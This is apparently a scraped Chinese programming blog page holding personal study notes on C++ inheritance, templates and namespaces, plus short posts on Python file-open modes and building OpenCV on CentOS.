protected 成员 外部调用者，无法直接访问类的实例对象的protected 成员； 内部调用者（成员函数）和友元，可以访问当前类和实例对象的protected 成员，但不能访问基类对象的 protected 成员； 相当于只能访问当前类的基类子对象的成员；不能访问普通基类对象的成员； 事实上，当访问普通基类对象的成员时，相当于外部用户了； 派生类说明符的作用，在于控制派生类的用户，对基类成员的访问权限 问题是这个访问权限不是已经在基类的 public&#x2F;protected&#x2F;private 中已经规定过了吗？ 经研究发现，这个说明符在前者的基础上，又增加了一层新的控制，可以覆盖前面的设置；而且这层控制是会继承下去的； 为什么要搞得这么复杂呢？为了更灵活，在一些场合覆盖既定的设置； 它还会控制派生类向基类转换的可访问性； 原因：当不能访问基类子对象时，显示派生类到基类的转换就无法成功； 在设计类的时候，它总共会有三种用户，三者的可访问性各不相同； 普通用户：只能访问 public 成员，不可访问 protected 和 private 成员 实现者及其友元：可以访问所有成员； 派生类及其友元；只能访问 public 和 protected 成员；不可访问 private 成员； 友元关系不能传递，也不能够继承，这意味着友元的权限，仅在当前类有限，对当前类的派生类是无效的； 但是，友元如果是某个子对象的友元，则可以访问子对象的成员； 通过 using 语句，可以单独改变某个成员对于用户的可访问性 前提：该成员必须是当前派生类的可访问成员；如果当前类访问不到这个成员，则 using 语句并没有鸟用； using 语句影响到的用户范围，跟 using 语句出现的位置有关 如果出现在 public 内，则面向所有用户； 如果出现在 private 内，则仅面向实现者及其友元； 如果出现在 protected 内，则面向派生类及其友元； 示例：派生类私有继承基类，此时派生类的用户不可访问基类成员（即使这个基类成员原本是公有的），然后通过在 public 关键字下面，增加声明 using Base::size ，则派生类的用户便获得了基类成员 size 的访问权限； 使用 class 关键字定义的派生类，默认私有继承，即等同于 class child: private parent；使用 struct 关键字定义的派生类，默认公有继承，即 struct child: public parent; 不过不管是公有继承，还是私有继承，好的做法是将 public 或 private 关键字显式的写出来，这样可以避免一些不必要的误会； struct 和 class 关键字只有两点区别：默认派生类访问说明符，默认成员访问说明符； 继承中的类作用域 派生类的作用域，是嵌套在基类中；正常情况下，对变量名的搜索顺序是先从派生类开始，然后逐级向上查找； 因此，当出现类的类型转换时，例如某个基类指针指向了派生类的对象，则通过该指针访问成员时，会直接从基类开始查找，这时候很可能找不到派生类的成员； 派生类的成员，将隐藏基类的同名成员；原因：在作用域搜索的时候，当前派生类的同名成员优先匹配； 可以通过作用域运算符来访问一个基类中被隐藏的同名成员； 原因：相当于指定了搜索的起始位置； 原则：派生类除了覆盖基类中的同名虚函数外，最好不要覆盖基类中的其他同名成员； 原因：这样很容易引起混乱，会产生难以发现的BUG； 编译器对于类的成员函数调用过程解析：确认静态类型 -&gt; 查找成员函数（由下至上逐级查找）-&gt; 类型检查 -&gt; 判断是否虚函数 如是，且为指针或引用调用，则确定采用哪个虚函数的版本 如不是，则生成常规调用； 由于名字查找先于类型检查，意味着派生类的同名函数会直接被调用，而不管基类中是否存在其他同名函数； 这也是为什么派生类和基类中的虚函数必须有相同的形参列表和返回类型，不然它们无法通过指针或引用实现动态绑定； 基类可能有多个版本的重载函数，派生类可能只想对其中的某1至2个进行修改，剩下的不修改；为了能够在派生类的作用域中实现正确的重载版本匹配，需要通过 using 声明语句，把基类的函数放在派生类的作用域中，然后派生类只需定义自己想要覆盖的函数即可，这样可以减少很多工作量； 格式：using base::func; 不需要提供形参列表，仅需声明一个名字即可； 感觉这个方法很像在当前作用域打开一个超链接；编译器优先在当前作用域中寻找函数，找到的即是覆盖后的版本；如果没有找到，再从引入的基类同名函数集进行查找； 构造函数和拷贝控制 虚析构函数 当在基类中定义一个虚析构函数时，我们就可以动态的绑定派生类版本的析构函数了；如果不这么做的话，有时候销毁一个对象时，会产生未定义的行为； 原因：派生类中的资源分配方式，和基类可能不一样，所以需要不同的资源释放方法； 基类有一条例外，即它一定会有一个析构函数，但它不一定会有拷贝控制成员；对于普通类，则是需要析构也意味着需要拷贝控制成员； 如果一个类定义了析构函数，则编译器将不再会为它合成移动函数；但如果需要，我们可以手动定义一个移动操作； 为什么？可能是因为合成的版本无法判断如何正确释放资源； 合成拷贝控制与继承 不管是构造、拷贝还是销毁，都会沿着继承体系发生链式发应； 派生类的对象是由多个子对象组成的，其中的一个子对象即是基类的对象，因此，若基类的某些函数被定义成删除的，则它们在派生类中也会是删除的； 原因：实现行为表现的一致性，避免发生未定义行为； 一般来说，如果基类中没有默认、拷贝或移动构造函数，则在派生类中也不会定义它们； 派生类的拷贝控制成员 当派生类定义了拷贝控制成员时，这些成员还将负责包括基类部分成员在内的拷贝或移动； 因此需要调用基类的构造函数，不然基类的成员很可能会使用默认初始化的值，这不一定是我们想要的结果； 在定义派生类的拷贝控制成员时，需要显式的调用基类对应的拷贝控制成员，用来初始化基类子对象部分； 派生类可以不用显式调用基类的析构函数，只需负责销毁自己的子对象成员即可，基类子对象的成员会按顺序自动销毁； 如果我们在构造函数或者析构函数中调用了虚函数，此时要特别小心，因为不管是构造函数还是析构函数，当它们执行的时候，对象都处于一种未完成的半成品状态，而此时调用虚函数的话，由于虚函数的动态绑定特性，它有可能会去绑定未完成的部分，导致调用失败抛出错误； 因此，如果一定要在构造函数或者析构函数中调用虚函数的话，一定要确保它匹配的版本，是当前类中定义的版本，而不是基类或者派生类的版本； 继承的构造函数 派生类只继承基类的构造函数，但不继承默认、拷贝、移动构造函数； “继承”一词用得也不准确，实际的机制并非真的是继承而来的；它是通过使用 using 语句声明来的； using 语句通常的作用是让某些东西在当前作用域可见，但此处用法有些不同，它的作用是将基类的构造函数，复制一份到派生类里面来，格式为 child(params): parent(args) { } using 不会改变构造函数的访问级别；构造函数在基类中是什么访问级别，在派生类中也仍然是相同的访问级别； using 也不会改变构造函数的 explicit 和 constexpr 属性； 当基类的构造函数有默认实参时，默认实参不会被继承；但是，派生类会获得多个版本的构造函数，其中一个版本包含默认实参，另外一个版本没有默认实参；但不管哪个版本，默认值都去掉了； 当派生类中有定义相同形参列表的构造函数，则基类中对应的构造函数会被覆盖，不会被继承； 容器与继承 由于容器要求保存的对象具备相同类型，因此，对于存在继承关系的两个对象，它们无法被完整的保存在容器中，派生类对象独有的成员会在复制过程中被切掉； 解决办法：在容器中存放对象的智能指针即可； 原因：指向派生类的智能指针，在被插入容器的过程中，会被转换成基类指针； 目的一：基类指针实际指向的是一个派生类对象，这样当进行解引用调用时，会触发动态绑定，正确访问相应的成员； 目的二：智能指针全部是基类类型，所以满足容器同类型的要求； 为了将继承体系中的不同类的对象放在同一个容器中，需要考虑： 自定义对象的比较函数，以便对象在容器中能够实现排序； 对于获取对象的数据成员，一般应使用虚函数，以便可以实现动态绑定； 容器添加元素的过程，实际是拷贝的过程，由于存放的是智能指针，因此拷贝过程不可避免涉及内存的分配；而分配内存需要知道类型，因为拷贝过程相当于也需要实现动态绑定，复制创建一份新对象，然后再使用基类智能指针绑定新创建的对象；最后存放到容器中； C++ 面向对象的悖论：无法直接使用对象进行面向对象编程，而是需要通过指针和引用； 原因：只有通过指针和引用，才能够实现动态绑定； 缺点：指针会增加复杂度，需要小心处理； 文本查询程序再探 如果派生类的基类是抽象基类，则如果在派生类没有覆盖纯虚函数，则该派生类仍然是抽象基类，不可实例化对象； 模板与泛型编程 定义模板 函数模板 格式：template T min(const T&amp;) 一个函数模板就是一个公式，用来生成针对特定类型的函数； 模板以关键字 template 开头，随后接着一个模板参数列表，包含1个或多个模板参数，列表不可为空； 模板参数很像函数的形参，它在实际使用时，会被替换为实参；之后编译器根据推断的参数类型，生成模板的实例，即函数； 模板类型参数需要使用关键字 class 或者 typename 来表示，例如 template ; 或者 template &lt;typename T, typename U&gt; class 和 typename 意思相同，可以互换，也可以同时使用；但从直观的角度来说，使用 typename 更好；（保证 class 是历史遗留原因） 模板还接受非类型的参数，这些参数必须是一个值；当模板实例化时，非类型参数会被用户或者编译器替换为值； 因此，这些非类型参数需要为常量表达式，这样编译器才有办法推断出它的值； 非类型参数不再使用 typename 来表示，而是使用普通的类型名；例如 template &lt;int A, int B&gt; 函数模板可以声明为 inline 或 constexpr，这两个关键字的位置应该放在模板参数列表右侧，返回类型左侧； template inline T min(const T&amp;) 泛型编码的两条原则 模板中的函数参数是 const 的引用（原因：以便模板可以适用于不可拷贝的实参，性能也会更好；因为如果不是引用，在调用函数时，会拷贝实参）； 函数体中的判断仅使用小于号 &lt; 进行比较（原因：避免强制要求实参必须定义其他运算符，使得模板更加通用）（原因跟 for 循环使用 !&#x3D; 做为结束条件判断类似） 头文件有可能只包含函数声明和类声明，但不包括类定义和函数定义；但模板的声明和定义则通常都放在头文件中，二者不分离； 模板调用者需要注意在使用模板时，所传入的类型，是否具备模板要求的一些条件，例如比较大小的模板一般要求传入的类型支持 &lt; 运算符； 对函数模板，在调用的时候，编译器会根据传入的实参，自动推断实参的类型； 类模板 格式 template class Blob { … } 类模板实例化出来的每一个实例，都是一个独立的类；这些类之间没有任何关联，互相之间也没有任何访问权限； 模板里面还可以嵌套其他模板，而且内部的模板可以使用外部的类型参数； 类模板的成员函数可以声明在模板内部，也可以声明在模板外部； 当声明在外部的时候，需要标注该成员函数是属于哪个模板； 示例：template void Blob::min(const T&amp;) { … } 通常类模板即使已经实例化了，但如果它的某些成员函数没有马上用到，则该成员函数就暂时不会实例化；需要等到用到时候才开始实例化； 这意味着即使有些类型不能完全满足类模板的要求，但类模板依然能够成功实例化，只要不要去使用哪些不满足条件的成员函数即可； 有一个例外，即单独对类模板进行实例化定义时（注：非声明），它会实例化所有成员； 当我们使用一个类模板类型时，是需要跟着类型实参的，例如 Blob，唯一例外的情况是在类内部，此时可以省略实参，而仅写类模板名即可，例如 Blob，不需要写 但是，以上例外仅适用于类模板的内部，如果是在类模板的外部，则仍然要写上类型实参； 事实上，此处严谨的说法应该是在类模板的“作用域”内，而不是类模板的内部；（貌似作用域除了在类内部外，还有其他地方没？） 如果类模板中有一个非模板友元，则该友元有权访问所有类模板的实例；如果类模板中的友元也是一个模板，则权限可能涵盖所有友元实例，也有可能只涵盖单一类型的友元实例； 在友元声明的时候，如果使用不同的模板参数名称，则意味着所有友元实例，都具有访问权限；类模板与友元模板之间没有绑定关系； 如果使用相同的类型参数，则限定只有同一种类型的友元实例，才具有访问权限； 在 C11 标准中，支持将模板参数声明为友元 示例 template class Bar { friend Type; } 有什么用？貌似可用于赋予访问权限给友元类的对象； 新标准引入了模板类型的别名，而且别名可以有一个或多个的参数 template using twin &#x3D; pair&lt;T, T&gt; twin 即为 pair&lt;int, int&gt; template using twin &#x3D; pair&lt;T, unsigned&gt; twin 即为 pair&lt;int, unsigned&gt; 类模板支持 static 成员，实例化后，相同实参类型的类实例，共享同一个 static 数据成员； static 数据成员跟函数成员一样，也是在使用的时候才会实例化； 模板参数 模板参数的作用域同普通的函数参数是一样的，从定义的位置开始，到块的末尾结束；区别在于 在参数列表中，参数只能出现定义一次，不可重复定义，例如 template &lt;typename T, typename T&gt; 是错误的； 在作用域内，不可以重用参数名（即不可两次或多次使用同一个参数名来表示不同的类型）； 就像普通函数一样，模板的声明和定义也是可以分开进行的；而且，里面用到的参数名字也可以不同，重点是保持格式相同就可以了，比如参数数量、顺序等； C++标准假定通过作用域运算符访问的名字不是类型，如果要表示该名字是一个类型，需要通过 typename 关键字显式告知（注：此处使用 class 代替 typename 无效） template typename T::value_type top(const T&amp;) &#x2F;&#x2F; 此处表示 value_type 是一个类型； 就像普通函数支持默认实参一样，模板参数也支持默认实参（C11 之前，只有类模板接受默认实参，函数模板不行）； 使用限制也同普通函数，即某个参数要有默认实参，前提是在参数列表中，该参数右侧的所有其他参数都已经设置了默认实参； template &lt;typename T, typename F &#x3D; less&gt; &#x2F;&#x2F; 此处以 T 实例化后的 less 作为类型 F 的默认值； int compare(const T &amp;v1, const T &amp;v2, F f &#x3D; F()) { … }; &#x2F;&#x2F; 此处以 F 默认初始化后的对象 F() 做为函数 compare 的第三个参数的默认值； 假设模板为所有参数提供了默认实参，例如 template Blob 当我们想使用这个模板的实例化类型时，需要提供一对空的尖括号，即 Blob&lt;&gt;；跟函数调用使用默认实参的原理是一样样的； 当然，我们也可以不使用默认实参的类型，而是自己提供类型，则此时应该将类型放在尖括号中，例如 Blob； 当我们在模板定义的位置中使用模板的实例化类型，即以 Blob 来表示，甚至还可以写成 Blob 成员模板 一个普通的类可以包含本身是模板的成员函数 目的：在调用该函数的时候，可以支持更多的类型；编译器会根据传入的实参自动推断类型； 当一个类定义了一个模板类型的成员函数，并重载了调用运算符，貌似意味着这个类变成了一个函数对象，并且这个函数对象支持各种参数类型；可以间接的实现将函数像值一样传递； 事实上貌似只要是函数对象都可以像值一样传递 一个类模板也可以包含本身是模板的成员函数 template class Blob { &#x2F;&#x2F; 此处声明了一个类模板 template Blob(It b, It e); &#x2F;&#x2F; 此处声明了一个构造函数模板 以上是在类模板的内部定义成员函数模板，我们也可以在类模板的外部，定义成员函数模板，区别在于要同时提供类模板的参数列表和成员模板的参数列表； template template Blob::Blob(It b, It e): … 在实例化的时候，我们仍然需要显式的提供类型实参给类模板，但成员模板则不用，它会根据传入的实参自动推断并获得类型； 控制实例化 不同的源文件使用了相同的模板和类型实参，意味着在不同的文件中会多次实例化，即产生多个实例，这样会产生很大的不必要开销； 那么，单个文件中多次使用相同的模板和类型实参，是否会产生多个实例，还是只会产生一个？ 貌似只会产生一个； 使用 extern 关键字，可以显式的告知编译器模板将在其他文件实例化定义，本文件请不要重复实例化；如果没有 extern 关键字的话，则编译器会在本文件进行实例化； 这也意味着其他文件和本文件需要链接在一起，才能完整使用； 发现实例化也分成两种，一种叫做普通实例化，一种叫做实例化定义； 普通实例化：Blob 或 int compare(const int &amp;a, const int &amp;b) 实例化定义：template class Blob 或 template int compare(const int&amp;, const int&amp;) 区别：实例化定义会实例化类模板的所有成员，因为它要求传入的类型实参，能够支持所有类模板的成员，否则估计要报错了； 效率与灵活性 在运行时绑定类型，会使得类的使用更加灵活；在编译时绑定类型，损失了灵活性，但提高了性能； 模板实参推断 类型转换与模板类型参数 将实参传递给函数模板的形参时，能够自动触发的类型转换只有三种情况：const 转换、数组指针转换、函数指针转换； 正常是不应该出现类型转换时，直接生成新的函数实例即可；关键的问题是，如果传入两个实参，它们的类型不同，但在定义的时候，却是共同一个形参名字，这个时候编译器要确定推断使用其中一个类型，剩下的另外一个类型就只好进行转换了； 如果要兼容允许传入不同类型的实参，则更好的做法还不如直接分开定义两种类型的模板参数，例如 template &lt;typename A, typename B&gt; … 注意：这两种类型需要满足成员函数的一些操作，例如比大小的操作，不然容易出错； 如果函数的参数类型不是模板参数，则传入实参时，会按照正常的转换规则进行类型转换（如需） 函数模板显式实参 C++ 也可以允许调用者传入更多的参数，让调用者来显式指定得到某种类型的结果 tempalte &lt;typename A, typename B, typename C&gt; A sum(B, C) 调用时，正确的做法 sum(int, int) &#x2F;&#x2F; 第一个 long 对应 A，其他两个自动推断匹配 B 和 C sum&lt;long, int, int&gt;(int, int) &#x2F;&#x2F; 不使用自动推断，手工显式全部指定好对应的类型； 注意：自动推断时，类型匹配是按顺序的，如果函数形参列表的顺序，与函数模板的参数列表顺序不同，则每次调用都要手工指定好对应的类型，无法使用自动推断； 如果我们不使用自动推断，而是手工指定对应位置的形参类型，则在传入实参时，编译器会将实参转换为对应类型的形参； long lng; compare(lng, 1024) &#x2F;&#x2F; 最后的结果是 long, long，1024 被转化成 long compare(lng, 1024) &#x2F;&#x2F; 最后的结果是 int, int, lng 被转换成 int 尾置返回类型与类型转换 当我们想从传入的参数，推断出类型，并做为返回的结果的类型时，除了使用显式指定实参的方法（笨拙一些，需要用户手工多写一个参数），还有一种方法是使用尾置返回格式（配合 auto 实现） template auto fcn(T begin, T end) -&gt; decltype(*beg) 缺点：这种做法中，如果传入的参数的类型是迭代器，则对迭代器的解引用进行 decltype 只能得到引用类型，得不到值类型； 克服缺点的办法：引入头文件 ，使用里面的 remove_reference 模板类，去除引用，读取里面的 type 成员，得到值类型 template typename remove_reference&lt;decltype(*beg)&gt;::type 注：由于作用域运算符读取成员的时候，默认按值处理，但此处我们想获得类型，所以需要使用 typename 关键字； 这个头文件中还有好几个其他的方法，用来：去引用、加常量符、加左值引用、加右值引用、去指针、加指针、加正负符号、去正负符号； 函数指针与实参推断 C++ 中允许使用函数模板，来给一个函数指针赋值，或者初始化一个函数指针（暂时不知道为什么允许这么做），由于函数指针实际需要指向一个函数对象，所以模板本质上是需要实例化的，以生产一个对象；此时编译器会根据函数指针里面的参数类型，来推断并提供实参给模板进行实例化 template int compare(const T&amp;, const T&amp;) int (*p)(const int&amp;, const int&amp;) &#x3D; compare &#x2F;&#x2F; 此处使用 compare 模板给指针 p 赋值，编译器会推断 T 的类型为 int； 如果编译器无法从函数指针的参数类型中进行推断时，就会报错；例如当函数有多个重载的版本时，编译器就不会确定到底选择哪个版本进行推断（二义性）； 解决的办法：显式的手工提供实参类型，让编译器知道选择哪个版本； func(compare); &#x2F;&#x2F; 传递 compare(const int&amp;, const int&amp;) 严谨的表述：当函数的参数，是一个函数模板实例的地址时（即函数指针），程序上下文必须保证每个模板的参数能够有唯一的值或类型； 假设 compare 就是函数 func 的参数，那么 compare 本质上是一个函数模板指针类型的变量，存的是函数模板的地址？ 模板实参推断与引用 当函数模板的参数是 T&amp; 类型时，不可接受右值（例如字面值）做为实参；但当它是 const T&amp; 的时候，就可以接受右值实参（难怪在设计函数的时候，前人经验总结是能够使用 const 的要尽量使用，它会使得函数更加具有通用性）； 当函数模板的形参类型是 const T&amp; 时，实参类型如果是 const int&amp;，是自动推断的结果 T 为 int 类型，而不会是 const int 类型； C++ 的引用在一定条件下会发生折叠，例如：T&amp; &amp;, T&amp; &amp;&amp;, T&amp;&amp; &amp; 都会折叠成 T&amp;；T&amp;&amp; &amp;&amp; 则会折叠成 T&amp;&amp;； 由于折叠的存在，使得当一个函数模板的参数类型定义为右值引用类型时，即 T&amp;&amp;，那么这个函数模板既可以接受左值实参，也可以接受右值实参，但它们的效果不太一样 传入左值实参，例如 int，T 被推断为左值引用类型 int&amp; 传入右值实参，T 被推断为原本的值类型 int； 注意： 折叠的发生条件局限于间接创建出来的“引用的引用”，例如模板参数或类型别名； 这种通用性会引入第二个问题，由于推断出来的 T 类型既有可能是引用类型，也有可能是值类型，那么它将我们在模板的代码逻辑带来巨大的混乱，我们很难编写同时适用于引用和值两种类型的代码； 为了解决以上的问题，C++ 又引入了模板重载来避免类型的多种可能性（但这样也意味着我们可能要同时写两份代码，个人感觉增加了很多的复杂度；如果一开始不允许引用折叠，或许就没有后续的这么多问题了，C++真是会搞事） 理解 std::move 实现原理： remove_reference，将引用去除，得到原本的值类型； static_cast，引入一条特许规则，可以显式的将左值引用转成右值引用； 转发 目标：在函数调用中保持参数的类型信息， 以便转发的时候，能够保持原样，原本是值，转发后还是值；原本是引用，转发后还是引用； 解决方案：通过引入头文件，使用其中的 std::forward 模板来解决；同时将函数模板的参数定义为右值引用 template &lt;typename F, typename T1, typename T2&gt; void flip(F f, T1 &amp;&amp;t1, T2 &amp;&amp;t2) { f(std::forward(t2), std::forward(t1)); } 重载与模板 C++ 是允许函数模板被另外一个同名函数或同名函数模板重载的，条件同样是参数类型和数量设置不同即可（唉，累不累）； 当有多个函数模板，都可以提供同样质量的匹配时，编译器会选择那个更特例化的版本，放弃更通用的版本； 这也意味着非模板的函数版本在同等条件下也会优先被编译器匹配； 定义多个函数模板的时候，有可能其中的某个模板，会调用另外一个模板，这意味着它们需要同时出现在同一个作用域，不然找不到导致调用失败；但由于有多个模板，编译器并不会报错，而是会从剩下的模板中找一个最接近的进行匹配，但这样的结果有可能并不是我们想要的； 可变参数模板 可变数目的参数被称为参数包，有两种，分别叫模板参数包和函数参数包（啥区别？） template &lt;typename T, typename… Args&gt; &#x2F;&#x2F; Args 表示零个或多个的模板参数 void foo(const T &amp;t, const Args&amp; … rest); &#x2F;&#x2F; rest 表示零个或多个的函数参数； 编译器会根据调用函数时传递的实参，来判断函数包中有几个参数，以及对应的类型； 可以使用 sizeof… 运算符来获取包中的参数数量 template &lt;typename… Args&gt; void g(Args … args) { cout &lt;&lt; sizeof…(Args) &lt;&lt; endl; &#x2F;&#x2F; 获取模板参数包的参数数量 cout &lt;&lt; sizeof…(args) &lt;&lt; endl; &#x2F;&#x2F; 获取函数参数包的参数数量； 编写可变参数的函数模板 实现原理：递归；定义一个函数的两个版本，第一个版本只接受一个参数，第二个版本接受两个参数，先处理第一个参数，第二个参数为函数包；然后以函数包调用它自己；这样每次调用都会从函数包中取出一个参数进行处理，逐级递减，直到最后调用第一个版本的函数（最后一次时，由于第一个版本更加特例化，编译器会优先匹配它，所以递归可以终止） 包扩展 所谓的包扩展，很像函数式编程中的 map 操作，将某种操作映射到列表中的每一个元素，并返回处理结果组成的列表； template &lt;typename… Args&gt; ostream &amp;errorMsg(ostream &amp;os, const Args&amp;… rest) { return print(os, debug_rep(rest)…; } 事实上，类似 const Args&amp;… 已经算是扩展了，它表示将 Args 中的每个元素进行 const &amp; 处理； 省略号是用来触发扩展操作的； 转发参数包 实现方法：右值参数+forward扩展 template &lt;typename… Args&gt; inline void StrVec::emplace_back(Args&amp;&amp;… args) { &#x2F;&#x2F; 此处将参数扩展为右值引用的类型 alloc.construct(first_free++, std::forward(args)…); &#x2F;&#x2F; 此处同时扩展了 Args 和 args； } 模板特例化 目的：当通用模板不适合用于处理某些特殊类型的实参时，通过定义一个特例化的版本来解决问题； 用空尖括号来表示将为原模板的所有参数提供实参 template &lt;&gt; int compare(const char* const p1, const char const *p2) { return strcmp(p1, p2); } 注意：一个特例化的版本，本质上是一个函数实例，而非函数模板的一个重载版本； 那为什么不直接定义一个非模板的普通函数，而是要定义一个模板的实例化版本？二者有什么本质的区别？ 模板特例化有顺序和位置的要求：所有模板及其特例化版本应该放在同一个文件中；同时，所有同名模板应该放在特例化版本声明的位置前面； 类模板也支持特例化滴 实现要求：需要在原模板的命名空间中，定义特例化的版本，同时放在包含类模板的文件中（一般为头文件）； 部分特例化：即只为部分模板参数提供实参；我们只能部分特例化类模板，但不能部分特例化函数模板； template struct remove_reference { typedef T type; } template struct remove_reference&lt;T&amp;&gt; { typedef T type; } template struct remove_reference&lt;T&amp;&amp;&gt; { typedef T type; } 允许特例化某个成员函数，而不是整个类；这种情况下，在实例化的时候，传入的参数如果跟之前部分特例化时提供的实参类型一致，就是触发该特例化的成员函数版本；如果不一致，则按正常规则进行特例化； 用于大型程序的工具 命名空间 命名空间定义 命名空间可以嵌套于其他命名空间中，但不能定义在类或函数的内部； 命名空间结束无须使用分号，这一点与类定义不同； 命名空间中的内容是可以不连续的，即可以分开成几部分单独定义，每一部分都是在前面部分基础上的追加； 当我们使用类似 namespace nsp { … } 的声明时，它既有可能是表示创建一个新的命名空间，也有可能是向已创建的同名字的命名空间中追加内容；取决于该命名空间之前是否已经创建过了； #include 操作应该放在命名空间之外；原因：放在内部是指将 include 的文件嵌套于已有的命名空间中，这可能并不是我们想要的； 同一个命名空间中定义的成员，可以直接使用，而无须加上命名空间的前缀；但命名空间之外的成员就需要加上前缀了； 命名空间中的成员也可以放在父级命名空间中进行定义，但是不能放在同级及同级的子空间中进行定义； 全局作用域本质上也是一个命名空间，只是它是隐式声明的；它是所有其他命名空间的父空间；可以通过双冒号显式访问全局命名空间中的成员（一般是因为有局部命名空间中出现同名成员的情况才会这么用，不然后直接用名字就可以访问到了） 对于嵌套的命名空间，如果出现同名，在内层使用变量时，内层的变量会覆盖外层同名变量； C11 引入了新东西，叫内联命名空间，该空间的成员可以被外层空间直接访问而无须加上前缀；通过在第一次定义的位置，加上 inline 关键字来声明内联； 这种特性可以用在什么场合呢？ 未命名的命名空间：享有静态生态周期（也就是说程序销毁的时候才会释放内存）（即使此局部子空间也是这样吗？） 局限：在单个文件中可以是不连续的，但不能跨越多个文件； 如果一个头文件中定义了未命名的命名空间，则在包含该头文件中的所有文件，都会有一个独立的未命名空间实体； 定义在未命令空间的名字可以直接使用（我们也没有名字可以访问它们，故只能直接使用了） 当未命名空间出现在最外层，也即全局命名空间那一层时，要特别小心，此时未命名空间中的名字要记得避免跟全局空间中的名字出现冲突； 未命名空间也可以嵌套在某个命名空间A中，此时通过 A:: 即可访问未命名空间的名字； 在新标准采用命名空间机制之前，一般是使用 static 关键字进行静态声明的作法，来控制某些变量的访问方式； 使用命名空间成员 命名空间支持定义别名进行访问 namespace primer &#x3D; cplusplus_primer; namespce qlib &#x3D; cplusplus_primer:QueryLib; &#x2F;&#x2F; 支持嵌套 一个命名空间也可以同时好几个别名，每个别名都跟命名空间等价； using 声明：用来引入命名空间中的单个成员； using 指示：用来引入命名空间中的所有成员； using 指示会带来提升效果，即将命名空间的成员全部提升到当前作用域的外层作用域中； 有可能会引入冲突（如果外层作用域存在同名变量的话）（当前作用域的变量反而不会出现冲突，因为当前作用域变量的优先级更高，会覆盖外层变量）； 头文件最多只能在它的函数或命名空间内使用 using 指示或声明；原因：如果头文件在其顶层作用域使用 using 指示，它会将命名空间引入所有包含该头文件的源文件中； 类、命名空间和作用域 实参查找：这里引入一条例外的规则，当我们给函数传递的实参是一个类类型时，除了正常的查找规则外，编译器还会到类类型所属的命名空间中进行查找； 这个例外规则的好处在于，对于标准库中某些函数的调用，可以不用显示的指定命名空间，带来了一些使用上的简便； std::move 和 std::forward 的形参是一个右值引用，这种类型的形参意味着它们可以匹配任何种类的实参，因此，也大大提高了出现函数匹配的二义性冲突的风险；因此，每次调用这两个函数时，通过添加 std:: 命名空间名字降低风险； 在一个类中声明某个友元的时候，其实也是这个友元的一种隐式声明的形式；假设该友元函数以类对象为参数，当调用这个友元函数的时候，根据实参查找规则，编译器还会到类所属的命名空间中查找函数，因此即使在调用友元函数前未显式声明这个友元函数，编译器仍然能够找到这个友元函数；反之，如果友元函数没有参数，则就找不到了； 重载与命名空间 调用函数时，如果参数是一个类类型，则查找范围包括该参数所属的命名空间，以及其基类所属的命名空间，此条规则影响深远，会带来很多变化； using 声明语句，声明的是一个名字，而非一个特定的函数；因此，同名的所有函数都会纳入当前作用域中； 当 using 声明语句所在作用域中有同名函数时，不可避免会发生冲突或者重载的影响； 单个或多个 using 指示也会发生重载，要小心； 其他事宜 代码变成可执行文件，需要进行编译；而代码文件的编译，需要依照一定的顺序，因为它们之间存在依赖关系，对编译顺序的安排，即是构建 build；即编译器按照构建提供的顺序进行编译，最后得到可执行文件；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"python 文件打开模式区别 r, r+, w, w+, a, a+","slug":"python 文件打开模式区别 r, r+, w, w+, a, a+","date":"2019-01-24T02:25:09.000Z","updated":"2024-09-21T23:18:19.093Z","comments":true,"path":"2019/01/24/python 文件打开模式区别 r, r+, w, w+, a, a+/","permalink":"http://example.com/2019/01/24/python%20%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%A8%A1%E5%BC%8F%E5%8C%BA%E5%88%AB%20r,%20r+,%20w,%20w+,%20a,%20a+/","excerpt":"","text":"r 模式 若文件存在，打开文件，光标置于开头，原数据可读，不可写入新数据； 若文件不存在，报错； r+ 模式 若文件存在，打开文件，光标置于开头，原数据保留，可写入新数据； 若文件不存在，报错； 注：打开文件后，若没有读取操作，则光标默认在开头，此时如果马上写入数据，会覆盖原数据 w 模式 若文件存在，打开文件，清空原数据，光标置于开头，可写入新数据； 若文件不存在，则创建文件； 注：文件的数据不可读； w+ 模式 效果同 w 模式，差异在于，可读取写入的数据（可通过移动光标的位置实现） a 模式 若文件存在，打开文件，原数据保留，光标置于末尾，可追加写入新数据； 若文件不存在，则创建文件； 注：文件数据不可读； a+ 模式 效果同 a 模式，差异在于，文件数据可读 注：打开文件后，由于光标在末尾，此时马上读取数据会为空，因为光标所在位置之后没有数据，此时可先移动光标的位置到开头后再读取；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"CentOS 安装 OpenCV","slug":"CentOS 安装 OpenCV","date":"2019-01-17T12:13:08.000Z","updated":"2024-09-21T23:13:36.072Z","comments":true,"path":"2019/01/17/CentOS 安装 OpenCV/","permalink":"http://example.com/2019/01/17/CentOS%20%E5%AE%89%E8%A3%85%20OpenCV/","excerpt":"","text":"安装一些依赖包1sudo yum install -y cmake gcc gtk2-devel numpy unzip 1sudo yum install -y qt5-qtbase-devel python-devel jasper-devel 1sudo yum install -y openexr-devel libwebp-devel libjpeg-turbo-devel 1sudo yum install -y freeglut-devel mesa-libGL mesa-libGL-devel libtiff-devel 1sudo yum install -y libdc1394-devel tbb-devel eigen3-devel 1sudo yum install -y boost boost-thread boost-devel libv4l-devel 1sudo yum install -y gstreamer-plugins-base-devel 注：理论上以上依赖包可以用一行 sudo yum install -y 命令一次性安装，之所以分成多行，是因为单行屏幕显示不下，导致折行后看起来不太方便，故拆分成多行安装，方便阅读； 进入文件夹12mkdir downloadscd downloads 注： 此处假定要将 opencv 安装包下载放在新创建的 downloads 文件夹中，如果不是，则相应修改文件夹名称 下载 opencv 安装包1wget https://github.com/opencv/opencv/archive/3.4.5.zip 注： 此处假定要下载 3.4.5 版本，如果不是，则相应修改版本号 解压安装包1unzip 3.4.5.zip 进入解压后的安装包1cd opencv-3.4.5 创建 build 目录1mkdir build 进入 build 目录1cd build 设置 make 参数1cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local .. 注：命令行最后有两个点，表示源代码在当前目录的父目录 开始构建12make# 注：此步需要等待较长时间 开始安装1make install 安装 opencv-python (可选）1pip install opencv-python 测试（可选）1python 用 python 命令启动 python 后，录入 